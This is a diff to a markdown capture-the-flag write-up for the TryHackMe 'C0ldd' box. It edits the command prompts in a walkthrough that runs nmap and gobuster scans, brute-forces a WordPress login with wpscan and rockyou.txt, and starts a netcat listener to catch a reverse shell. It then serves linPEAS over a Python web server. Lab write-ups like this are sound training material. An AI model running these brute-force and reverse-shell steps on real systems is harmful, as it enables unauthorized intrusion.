@@ -4,7 +4,7 @@
 It is a cool box (literally). So lets start some Hacking …
 So lets start with some nmap scan to enumerate which all ports are open.
 ```bash
-# nmap -T4 -sV -A target > nmap_scan.txt 
+$ sudo nmap -T4 -sV -A target > nmap_scan.txt 
 ```
 ![1](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/1.png)
 
@@ -12,7 +12,7 @@ So port 80 is open that I already knew by opening the ip in web browser.
 Since it was a web page I began directory search to see is there any broken
 access control.
 ```bash
-# gobuster dirb -u target:80 --wordlist /usr/share/wordlists/dirb/small.txt -e -o dir.txt 
+$ sudo gobuster dirb -u target:80 --wordlist /usr/share/wordlists/dirb/small.txt -e -o dir.txt 
 ```
 ![2](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/2.png)
 
@@ -25,7 +25,7 @@ And since web page is made on wordpress and there is a login page, great
 option to bruteforce wordpress login is using wpscan.
 
 ```bash
-$ wpscan --url http://target/wp-login.php -e u -P /usr/share/wordlist/rockyou.txt 
+$ sudo wpscan --url http://target/wp-login.php -e u -P /usr/share/wordlist/rockyou.txt 
 ```
 ![4](https://github.com/nairitya03/CTF-WriteUps/blob/main/THM/C0ldd_BOX/Screenshots/4.png)
 
@@ -40,7 +40,7 @@ reverse shell script on
 
 I started a netcat listener on my machine on port 8000 
 ```bash 
-# nc -lvnp 8000 
+$ sudo nc -lvnp 8000 
 ```
 and got a reverse shell by activating our plugin and found that www-data
 user have very less permissions thus I enumerated the target using
@@ -49,7 +49,7 @@ e/tree/master/linPEAS ).Download the linpeas.sh file form Github on your
 machine,cd to the downloaded directory and start a simple python server on
 your machine 
 ```bash 
-# python3 -m http.server 1234 
+$ python3 -m http.server 1234 
 ``` 
 and on target run it using
 ```bash 
